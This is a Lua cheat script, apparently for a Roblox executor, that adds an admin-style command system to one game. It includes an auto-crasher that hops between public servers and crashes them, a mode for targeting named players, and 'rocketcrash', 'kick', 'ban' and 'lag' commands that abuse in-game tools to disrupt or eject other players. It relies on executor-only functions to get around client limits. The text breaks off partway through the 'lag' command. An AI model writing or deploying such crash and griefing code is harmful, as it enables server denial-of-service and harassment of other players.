local Settings = {
    ["Autorun Commands"] = {"antikick","antiservercrash","antiabuse","antiname","nokill","localremoveobby","fixvelocity","runcommand logs","antivoid","antifly","autogod","platform","crashdetector","afkindicator","antiskydive","antigrav","antiepilepsy","antilighting","nethelper","draggablelogs","serverdata","antispeed","blacklisttools DaggerOfShatteredDimensions;BlackHoleSword;HotDogOnAStick;AzureDragonMagicSlayerSword"}, -- Commands to run automatically
    ["Default Whitelisted"] = {}, -- People whitelisted by default
    ["Default Banned"] = {}, -- People banned by default [Buggy]
    ["Default Softlocked"] = {}, -- People softlocked by Default
    ["Player Crash Settings"] = {["Vampire"] = false, ["Players"] = {}}, -- Automatically crashes server if one of these players are in it
    ["Prefix"] = ".", -- Prefix used for running commands
    ["Person299's Admin"] = true, -- If you do not own Person299's Admin, some commands will be fixed appropriately
    ["Legacy Serverlock"] = true, -- Softlocks players instead of crashing
    ["Punish Based Softlock"] = true, -- Uses punishing for softlocking instead of sizing and sending to heaven
    ["Script Name"] = "ii' s St upid Ad min", -- Change the name of the script, default "ii' s St upid Ad min"
    ["Welcome Message"] = "Successfully ran.", -- Change the message that is shown when running the script, default "Successfully ran."
    ["Custom Color"] = Color3.new(0, 0, 0), -- Custom color for stuff like platform, disable using nil
    
    ["Auto Crasher"] = { -- Automatically serverhop and crash servers
	["Enabled"] = false,
	["Message"] = "Auto crasher message", -- Message to send upon before crashing, set to nil if no message
	["Serverhop Time"] = 10, -- Serverhops after specified amount of time
	["Skip Crashed Servers"] = false, -- Uses savehop instead of serverhop
	["Timeout"] = 10, -- Gives up on joining a server after a specified amount of time
	["Commands"] = {"music 6853070044",".timepositionmusic 7"}, -- Commands to run on join
	["Command Delay"] = -1, -- Delay between commands, -1 is none
	["Ignore Autorun Commands"] = true, -- Skips the autorun commands
	["Time Before Crash"] = .5, -- Time before crashing server, -1 is instant
	["Crash"] = true, -- If true, it will crash
	["Vampire"] = false, -- Use Vampire Vanquisher to crash the servers
	["Whitelisted Players"] = {}, -- Do not crash servers with these players in it
	["Targetted Players"] = { -- Automatically attempts to join players and crash their server
	    ["Enabled"] = false,
	    ["Use Join Player"] = false, -- Uses the joinplayer command, which is very unstable
	    ["Ignore Whitelisted"] = true, -- Crashes even if a whitelisted player is in the server
	    ["Players"] = {} -- Players that get targetted
	}
    },
    
    ["Player Autorun Commands"] = { -- Automatically runs commands when these players are detected
	["jjjuuikjjikkju"] = "characteradded jjjuuikjjikkju runcommand hat jjjuuikjjikkju 14734872696"
    }
}

task.spawn(function()
	if Settings["Auto Crasher"]["Enabled"] then
		task.wait(Settings["Auto Crasher"]["Timeout"])
		if not game:IsLoaded() then
			if Settings["Auto Crasher"]["Skip Crashed Servers"] then
				function GetOldServers()
					if isfile("PreviousServers.txt") then
						return readfile("PreviousServers.txt"):split(";")
					else
						return {}
					end
				end
				
				function WriteOldServers(Data)
					if isfile("PreviousServers.txt") then
						appendfile("PreviousServers.txt",";"..Data)
					else
						writefile("PreviousServers.txt",Data)
					end
				end
				
				function Savehop()
					local OldServers = GetOldServers()
					local Servers = {}
					for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
						if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId and not table.find(OldServers,game.JobId) then
							table.insert(Servers,v.id)
						end
					end
					
					if not table.find(OldServers,game.JobId) then
						WriteOldServers(game.JobId)
					end
					if #Servers~=0 then
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
					else
						print("No servers found, retrying in 10 seconds")
						spawn(function()
							wait(10)
							Savehop()
						end)
					end
				end
				
				Savehop()
				game:GetService("TeleportService").TeleportInitFailed:Connect(Savehop)
			else
				function Serverhop()
					local Servers = {}
					for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
						if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId then
							table.insert(Servers,v.id)
						end
					end
					
					if #Servers~=0 then
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
					else
						game:GetService("TeleportService"):Teleport(game.PlaceId)
					end
				end
		
				Serverhop()
				game:GetService("TeleportService").TeleportInitFailed:Connect(Serverhop)
			end
		end
	end
end)

repeat wait() until game:IsLoaded()
if game.PlaceId ~= 112420803 then return end

local loadtime = os.clock()
local owner = game.Players.LocalPlayer
local player = owner
local localplayer = owner
local lp = owner
local plr = owner
local chr = owner.Character
local character = owner.Character
local char = owner.Character
local consoleOn = true
local running = true
local prefix = Settings["Prefix"]
local ScriptName = Settings["Script Name"]
local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request;
local GUI = {}
local commandlist = {}
local Connections = {}
local Loops = {}
local Toolbans = {}
local ServerLockedProtection = {}
local Whitelisted = Settings["Default Whitelisted"]
local Banned = Settings["Default Banned"]
local DefaultSoftlocked = Settings["Default Softlocked"]
local PlayerCrash = Settings["Player Crash Settings"]["Players"]
local PlayerCrashMode = Settings["Player Crash Settings"]["Vampire"]
local PersonsAdmin = Settings["Person299's Admin"]
local LegacyKick = false
local OldServerLock = Settings["Legacy Serverlock"]
local PunishSoftlock = Settings["Punish Based Softlock"]
local ServerLocked = false
local ServerLockedSoundEnabled = false
local ServerLockedSound = ""
local BanSoundsEnabled = false
local BanSound = ""
local CommandBar = nil
local CurrentWebsocket = nil
local WsPerExecutor = (syn and syn.websocket) or WebSocket
local CustomColor = Settings["Custom Color"]

Connections["_CharacterUpdater"] = game:GetService("RunService").RenderStepped:Connect(function()
    chr=owner.Character
    character=owner.Character
    char=owner.Character
end)

local Audios = {}
spawn(function()
local s,f=pcall(function()
local audioHttpRequest = game:HttpGet("https://pastebin.com/raw/avxb44gq")
for i,v in pairs(audioHttpRequest:split("\n")) do
    local data = v:split(";")
    table.insert(Audios,{data[1],data[2],data[3],data[4]})
end
end)if s then print("Bypassed audios loaded successfully")else print("Bypassed audios could not be loaded")end end)

local lettersStringFormat=[[abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+={}|[]\;',./<>?:`~-]]
local lettersTableFormat={}
for i=1,#lettersStringFormat do
    table.insert(lettersTableFormat,lettersStringFormat:sub(i,i))
end

function GUI:SendMessage(name,text)
    if PersonsAdmin then
        game.Players:Chat("h/"..string.rep("\n",34).."["..name.."]")
        game.Players:Chat("h/"..string.rep("\n",36)..text)
    else
        game.Players:Chat("h "..string.rep("\n",34).."["..name.."]")
        game.Players:Chat("h "..string.rep("\n",36)..text)
    end
end

function GUI:SendMessageNoBrackets(name,text)
    if PersonsAdmin then
        game.Players:Chat("h/"..string.rep("\n",34)..name)
        game.Players:Chat("h/"..string.rep("\n",36)..text)
    else
        game.Players:Chat("h "..string.rep("\n",34)..name)
        game.Players:Chat("h "..string.rep("\n",36)..text)
    end
end

function GetPlayers(jjk)
local boss = lp
local fat = {}
if jjk:lower() == "me" then 
return {boss} 

elseif jjk:lower() == "all" or jjk:lower() == "*" then 
return game:GetService("Players"):GetChildren() 

elseif jjk:lower() == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name ~= boss.Name then
table.insert(fat,v)
end
end
return fat

elseif jjk:lower() == "random" then
return {game:GetService("Players"):GetChildren()[math.random(1,#game:GetService("Players"):GetChildren())]}

else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.Name:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.DisplayName:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
return fat
end

end

--These are the functions used for playing music and sounds
function GetGuitar()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("GuitarSword") then
        return game.Players.LocalPlayer.Character:FindFirstChild("GuitarSword")
    else
        game.Players:Chat("gear me 60357982")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetDrum()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("DrumKit") then
        return game.Players.LocalPlayer.Character:FindFirstChild("DrumKit")
    else
        game.Players:Chat("gear me 33866728")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetBongo()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("BongoDrums") then
        return game.Players.LocalPlayer.Character:FindFirstChild("BongoDrums")
    else
        game.Players:Chat("gear me 57902997")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetPaint()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") then
        return game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket")
    else
        game.Players:Chat("gear me 18474459")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetBoombox()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("SuperFlyGoldBoombox") then
        return game.Players.LocalPlayer.Character:FindFirstChild("SuperFlyGoldBoombox")
    else
        game.Players:Chat("gear me 212641536")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetNewBoombox()
    game.Players:Chat("gear me 212641536")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
    local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
    tool.Parent = game.Players.LocalPlayer.Character
    return tool
end
function PlaySound(SoundId,Looping)
    spawn(function()
        local Boombox = GetNewBoombox()
        Boombox.Remote:FireServer("PlaySong",SoundId)
        if not Looping then
            repeat wait() until Boombox.Handle.Sound.IsLoaded and Boombox.Handle.Sound.Playing
            wait(Boombox.Handle.Sound.TimeLength)
            Boombox.Handle.Sound:Stop()
            Boombox.Handle:Destroy()
        end
    end)
end
function PlayNote(Note)
    local Tool = GetGuitar()
    Tool.Handle:FindFirstChild(Note):Play()
end
function PlayDrum(Sound)
    local Tool = GetDrum()
    Tool.Handle:FindFirstChild(Sound):Play()
end
function PlayBongo(Sound)
    local Tool = GetBongo()
    Tool.Handle:FindFirstChild(Sound):Play()
end

function checkGamepass(Target,ID)
    local data = game:GetService("HttpService"):JSONDecode(game:HttpGetAsync('https://inventory.roblox.com/v1/users/'..Target.UserId..'/items/GamePass/'..ID)).data
    
    if data then
        if #data > 0 then
            return "200"
        else
            return "403"
        end
    else
        print("Request to "..Target.Name.." for "..ID.." failed")
        return "404"
    end
end

function dropRock(Position)
	spawn(function()
		game.Players:Chat('gear me 90718686')
		repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("ConjurorsFist")
		local wand = game.Players.LocalPlayer.Backpack:FindFirstChild("ConjurorsFist")
		wand.Parent = game.Players.LocalPlayer.Character
		wait(0.25)
		wand.Client.Disabled = true
		function wand.MouseLoc.OnClientInvoke()
			return Position
		end
		wand:Activate()
		wait(3.5)
		wand:Destroy()
		game.Players:Chat("removetools me")
	end)
end

function checkIsCrashed()
	local Ping1 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        task.wait(1)
        local Ping2 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    
        if Ping1 == Ping2 then return true else return false end
end

function stringToBool(str)
	return (str == "true")
end

function moveObject(target,wawawaa)
    function equipivory()
    	if lp.Backpack:FindFirstChild("IvoryPeriastron") then
    		lp.Backpack.IvoryPeriastron.Parent = lp.Character
    	else
    	    if not lp.Character:FindFirstChild("IvoryPeriastron") then
        	    game.Players:Chat("gear me 108158379")
        	    repeat wait() until lp.Backpack:FindFirstChild("IvoryPeriastron")
        	    lp.Backpack.IvoryPeriastron.Parent = lp.Character
        	end
    	end
    end
    equipivory()
	if lp.Character:FindFirstChild("IvoryPeriastron") then
		local cf = lp.Character.HumanoidRootPart
		local setdadamncframe = true
		local thedollar = wawawaa
		spawn(function()
        repeat game:GetService("RunService").RenderStepped:Wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = thedollar
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
        until not setdadamncframe
        end)
		wait(0.2)
        setdadamncframe = false
		lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
		cf.Anchored = false
		local looping = true
		local thedollarsecondary = Instance.new("Part",cf.Parent)
		thedollarsecondary.Anchored = true
		thedollarsecondary.Size = Vector3.new(10,1,10)
		thedollarsecondary.CFrame = (target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)) * CFrame.new(0,-3.5,0)
		spawn(function()
			while true do
				game:GetService('RunService').Heartbeat:wait()
				game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
				target.RotVelocity = Vector3.new(0,0,0)
		                target.Velocity = Vector3.new(0,0,0)
		                cf.Velocity = Vector3.new(0,0,0)
		                cf.RotVelocity = Vector3.new(0,0,0)
			    cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)
				if not looping then break end
			end
		end)
		spawn(function() while looping do game:GetService('RunService').Heartbeat:wait() game:GetService("Players"):Chat('unpunish me') end end)
		wait(0.3)
		looping = false
		lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
		wait(0.3)
		game:GetService("Players"):Chat("respawn me")
		
	end
end

function getSoundId(githubLink,fileName)
    if not isfolder("LocalMusic") then makefolder("LocalMusic") end
    if not isfile("LocalMusic/"..tostring(fileName)..".mp3") then
        writefile("LocalMusic/"..tostring(fileName)..".mp3",HttpRequest({Url=githubLink, Method='GET'}).Body)
    end
    return getcustomasset("LocalMusic/"..tostring(fileName)..".mp3")
end

function fixNet() -- vekco again with jove
	setsimulationradius(999.999,math.huge)
	settings().Physics.AllowSleep = false
	settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
	sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 999.999)
	sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)
end

function splitPart(part) -- vekco with love
	local currentSize = part.Size
	local splits = Vector3.new(
		math.ceil(currentSize.X / 10),
		math.ceil(currentSize.Y / 10),
		math.ceil(currentSize.Z / 10)
	)
	local splitCount = splits.X * splits.Y * splits.Z
	local originalCFrame = part.CFrame
	local newParts = {}
	local offsetX = currentSize.X / splits.X
	local offsetY = currentSize.Y / splits.Y
	local offsetZ = currentSize.Z / splits.Z
	local startOffset = CFrame.new(
		(-currentSize.X / 2) + (offsetX / 2),
		(-currentSize.Y / 2) + (offsetY / 2),
		(-currentSize.Z / 2) + (offsetZ / 2)
	)
	for x = 1, splits.X do
		for y = 1, splits.Y do
			for z = 1, splits.Z do
				local splitPart = part:Clone()
				local newSizeX = math.min(offsetX, currentSize.X - (x - 1) * offsetX)
				local newSizeY = math.min(offsetY, currentSize.Y - (y - 1) * offsetY)
				local newSizeZ = math.min(offsetZ, currentSize.Z - (z - 1) * offsetZ)
				splitPart.Size = Vector3.new(newSizeX, newSizeY, newSizeZ)
				local positionOffset = startOffset * CFrame.new((x - 1) * offsetX, (y - 1) * offsetY, (z - 1) * offsetZ)
				splitPart.CFrame = originalCFrame * positionOffset
				splitPart.Parent = workspace
				table.insert(newParts, splitPart)
			end
		end
	end
	part:Destroy()

	return newParts, splitCount
end

function addCommand(name,args,func)
    table.insert(commandlist,{name,args,func})
end

function runCommand(param1,specargs)
    for i,asdfuhiswuejfniuserf in pairs(commandlist) do
        if prefix..asdfuhiswuejfniuserf[1] == param1 and running then
            if #specargs > #asdfuhiswuejfniuserf[2]-1 then
		pcall(function()
            local s,f = pcall(asdfuhiswuejfniuserf[3](specargs))
            if not s then if consoleOn then print(f) end end
end)
            return
            else
                local lister = prefix..asdfuhiswuejfniuserf[1].." "
                for i,d in pairs(asdfuhiswuejfniuserf[2]) do lister = lister..d.." " end
                GUI:SendMessage(ScriptName, "\n\nThe command you have recently sent is not properly formatted.\n The correct format is: \n "..lister)
            end
        end
    end
end

function getCommand(param1)
    local fat={}
    for i,v in pairs(commandlist) do
        if param1:lower() == v[1]:lower():sub(1,#param1) and not table.find(fat,v) then
        table.insert(fat,v)
        end
        end
    return fat
end

addCommand("cmds",{},function()
    if consoleOn then print("-:COMMANDS ["..tostring(#commandlist).."]:-") end
    for i,v in pairs(commandlist) do
        local lister = ""
        for i,d in pairs(v[2]) do lister = lister..d.." " end
        if consoleOn then print(v[1].." "..lister)end
    end
    GUI:SendMessage(ScriptName, "Check the developer console for the commands.")
end)

addCommand("prefix",{"newprefix"},function(args)
    prefix = args[1]
    GUI:SendMessage(ScriptName, "Set prefix to "..prefix.." successfully.")
end)

addCommand("customcolor",{"r","g","b"},function(args)
	CustomColor = Color3.fromRGB(args[1],args[2],args[3])
	GUI:SendMessage(ScriptName, "Set custom color successfully.")
end)

addCommand("scriptname",{"name"},function(args)
    local fixer = args[1]
	for i=2,#args do
		fixer=fixer.." "..args[i]	
	end
	ScriptName = fixer
    GUI:SendMessage(ScriptName, "Set script name to "..ScriptName.." successfully.")
end)

addCommand("altcmds",{},function()
    for i,v in pairs(commandlist) do
        local lister = ""
        for i,d in pairs(v[2]) do lister = lister..d.." " end
        game.Players:Chat("ff "..v[1].." "..lister)
        wait()
    end
    wait()
    game.Players:Chat("ff -:COMMANDS ["..tostring(#commandlist).."]:-")
    wait()
    GUI:SendMessage(ScriptName, "Check logs for list of commands.")
end)

addCommand("toolban",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        Toolbans[v.Name] = v.Backpack.ChildAdded:Connect(function()
            game.Players:Chat("removetools "..v.Name)
        end)
    end
end)

addCommand("untoolban",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        pcall(function()
            Toolbans[v.Name]:Disconnect()
        end)
    end
end)

addCommand("rocketcrash",{"player"},function(args)
	if PersonsAdmin then
	local cacheAntiAbuse = Loops.antiabuse
	if cacheAntiAbuse then runCommand(prefix.."unantiabuse",{}) end
	for i,v in pairs(GetPlayers(args[1])) do
		local a = true
	    for i=1,150 do
	    	if a then
	    		game.Players:Chat("rocket/me/me/me")
 	   	else
  	  		game.Players:Chat("rocket/"..v.Name.."/"..v.Name.."/"..v.Name)
  	  	end
  	  	a=not a
 	   end
  	  wait(0.333)
	game.Players.LocalPlayer.Character.Humanoid:ChangeState(6)
	game.Players.LocalPlayer.Character.Animate:Destroy()
	for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do v:Stop()end
	game.Players:Chat("respawn "..v.Name)
	game.Players:Chat("fly "..v.Name)
 	   local timer = os.clock()
local a = true
 	   repeat game:GetService("RunService").RenderStepped:Wait()
		spawn(function()
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name == "Rocket" then v.CanCollide = false end
		end
		for i,v in pairs(v.Character:GetChildren()) do
			if v.Name == "Rocket" then v.CanCollide = false end
		end
 	   	--game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,1)*CFrame.Angles(0,math.rad(math.random(0,360)),0) * CFrame.new(0,0,-1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0)*CFrame.new(0,0,-2)
		for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			pcall(function()
				v.Velocity = Vector3.new(0,0,0)
				v.RotVelocity = Vector3.new(0,0,0)
			end)
		end
		if a then
	    		game.Players:Chat("rocket/me/me/me")
 	   	else
  	  		game.Players:Chat("rocket/"..v.Name.."/"..v.Name.."/"..v.Name)
  	  	end
  	  	a=not a
		end)
 	   until os.clock()-timer>30 or not v
		game.Players:Chat("respawn me")
		wait(0.333)
	end
	if cacheAntiAbuse then runCommand(prefix.."antiabuse",{}) end
	else
		GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.")
	end
end)

addCommand("rocketcrashsound",{"player","soundid"},function(args)
	local cacheAntiAbuse = Loops.antiabuse
	local cacheAntiSkydive = Loops.antiskydive
	if cacheAntiAbuse then runCommand(prefix.."unantiabuse",{}) end
	if cacheAntiSkydive then runCommand(prefix.."unantiskydive",{}) end
	for i,v in pairs(GetPlayers(args[1])) do
		local a = true
	    for i=1,150 do
	    	if a then
	    		game.Players:Chat("rocket/me/me/me")
 	   	else
  	  		game.Players:Chat("rocket/"..v.Name.."/"..v.Name.."/"..v.Name)
  	  	end
  	  	a=not a
 	   end
  	  wait(0.333)
	game.Players.LocalPlayer.Character.Humanoid:ChangeState(6)
	game.Players.LocalPlayer.Character.Animate:Destroy()
	for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do v:Stop()end
	game.Players:Chat("music "..tostring(args[2]))
	game.Players:Chat("fly "..v.Name)
 	   local timer = os.clock()
local a = true
 	   repeat game:GetService("RunService").RenderStepped:Wait()
		spawn(function()
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name == "Rocket" then v.CanCollide = false end
		end
		for i,v in pairs(v.Character:GetChildren()) do
			if v.Name == "Rocket" then v.CanCollide = false end
		end
 	   	--game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,1)*CFrame.Angles(0,math.rad(math.random(0,360)),0) * CFrame.new(0,0,-1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0)*CFrame.new(0,0,-2)
		for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			pcall(function()
				v.Velocity = Vector3.new(0,0,0)
				v.RotVelocity = Vector3.new(0,0,0)
			end)
		end
		if a then
	    		game.Players:Chat("rocket/me/me/me")
 	   	else
  	  		game.Players:Chat("rocket/"..v.Name.."/"..v.Name.."/"..v.Name)
  	  	end
  	  	a=not a
		end)
 	   until os.clock()-timer>30
		game.Players:Chat("respawn me")
		game.Players:Chat("music nan")
		wait(0.333)
	end
	if cacheAntiAbuse then runCommand(prefix.."antiabuse",{}) end
	if cacheAntiSkydive then runCommand(prefix.."antiskydive",{}) end
end)

addCommand("potatocrash",{"player"},function(args)
    GUI:SendMessage(ScriptName, "This command has been patched.")
    --[[
    if LegacyKick then
        local cacheAntiKick = Loops.antikick
        if cacheAntiKick then Loops.antikick = false end
        local Player = GetPlayers(args[1])
        for i,v in pairs(Player) do
            for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
            local pos = chr.HumanoidRootPart.CFrame
            game.Players:Chat("size "..v.Name.." nan")
            wait()
            game.Players:Chat("freeze "..v.Name)
            wait()
            for i=1,5 do
                game.Players:Chat("gear me 25741198")
                wait()
            end
            wait()
            chr.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,7.5)
            wait(0.25)
            chr.HumanoidRootPart.Anchored=true
            wait()
            for i,v in pairs(plr.Backpack:GetChildren()) do
                v.Parent = chr
                wait()
                v:Activate()
                wait()
                v.Parent=workspace
                wait()
            end
            chr.HumanoidRootPart.Anchored=false
            chr.HumanoidRootPart.CFrame = pos
        end
        wait(0.1)
        if cacheAntiKick then runCommand(prefix.."antikick",{}) end
    else
    local cacheAntiKick = Loops.antikick
    if cacheAntiKick then Loops.antikick = false end
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
        local pos = chr.HumanoidRootPart.CFrame
        game.Players:Chat("size "..v.Name.." nan")
        wait()
        game.Players:Chat("noclip "..v.Name)
        wait()
        for i=1,5 do
            game.Players:Chat("gear me 25741198")
            wait()
        end
        repeat wait() until #plr.Backpack:GetChildren()>4
        for i,v2 in pairs(plr.Backpack:GetChildren()) do
            spawn(function()
            v2.Parent = chr
            v2:Activate()
            firetouchinterest(v2.Handle,v.Character:FindFirstChildOfClass("Part"),0)
            end)
        end
    end
    wait(0.5)
    if cacheAntiKick then runCommand(prefix.."antikick",{}) end
    end
    ]]
end)

addCommand("potatocrashsound",{"player","soundid"},function(args)
    GUI:SendMessage(ScriptName, "This command has been patched.")
    --[[
    if LegacyKick then
        local cacheAntiKick = Loops.antikick
    if cacheAntiKick then Loops.antikick = false end
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
        local pos = chr.HumanoidRootPart.CFrame
        game.Players:Chat("size "..v.Name.." nan")
        wait()
        game.Players:Chat("freeze "..v.Name)
        wait()
        for i=1,5 do
            game.Players:Chat("gear me 25741198")
            wait()
        end
        wait()
        chr.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,7.5)
        wait(0.25)
        chr.HumanoidRootPart.Anchored=true
        wait()
        game.Players:Chat("music "..args[2])
        for i,v in pairs(plr.Backpack:GetChildren()) do
            v.Parent = chr
            wait()
            v:Activate()
            wait()
            v.Parent=workspace
            wait()
        end
        chr.HumanoidRootPart.Anchored=false
        chr.HumanoidRootPart.CFrame = pos
        game.Players:Chat("music nan")
    end
    wait(0.1)
    if cacheAntiKick then runCommand(prefix.."antikick",{}) end
    else
    local cacheAntiKick = Loops.antikick
    if cacheAntiKick then Loops.antikick = false end
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("music "..args[2])
        for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
        local pos = chr.HumanoidRootPart.CFrame
        game.Players:Chat("size "..v.Name.." nan")
        wait()
        game.Players:Chat("noclip "..v.Name)
        wait()
        for i=1,5 do
            game.Players:Chat("gear me 25741198")
            wait()
        end
        repeat wait() until #plr.Backpack:GetChildren()>4
        for i,v2 in pairs(plr.Backpack:GetChildren()) do
            spawn(function()
            v2.Parent = chr
            v2:Activate()
            firetouchinterest(v2.Handle,v.Character:FindFirstChildOfClass("Part"),0)
            end)
        end
    end
    wait(0.5)
    game.Players:Chat("music nan")
    if cacheAntiKick then runCommand(prefix.."antikick",{}) end
    end
    ]]
end)

addCommand("kicksound",{"player"},function(args)
    runCommand(prefix.."rocketcrashsound",args)
end)

addCommand("kick",{"player"},function(args)
    runCommand(prefix.."rocketcrash",args)
end)

addCommand("ban",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        table.insert(Banned,v.Name)
        if BanSoundsEnabled then
            runCommand(prefix.."rocketcrashsound",{v.Name,BanSound})
        else
            runCommand(prefix.."rocketcrash",{v.Name})
        end
    end
end)

addCommand("lag",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)
    local thedollarsecondary = Instance.new("Part",game.Players.LocalPlayer.Character)
    		thedollarsecondary.Anchored = true
    		thedollarsecondary.Size = Vector3.new(100,1,100)
    		thedollarsecondary.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
    		wait(0.25)
    		game.Players:Chat("tp "..v.Name.." me")
    		print("teleporting player")
        repeat wait()
